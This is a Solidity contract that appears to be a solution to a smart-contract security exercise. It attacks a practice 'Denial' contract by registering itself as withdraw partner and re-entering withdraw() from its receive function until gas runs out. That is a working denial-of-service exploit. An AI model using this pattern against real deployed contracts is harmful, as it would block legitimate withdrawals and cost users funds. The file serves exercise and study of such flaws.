pragma solidity ^0.6.0;

import "../../../Exercise/Stage1/20/Denial.sol";
import "hardhat/console.sol";

contract AttackDenial {
    Denial denialContract;

    constructor(Denial victimContract) public{
        denialContract = victimContract;
    }

    receive() payable external {
        console.log(denialContract.contractBalance());
        if (gasleft() > 5) {
            denialContract.withdraw();
        }
    }

    function attack() public {
        denialContract.setWithdrawPartner(address(this));
        denialContract.withdraw();
    }

}
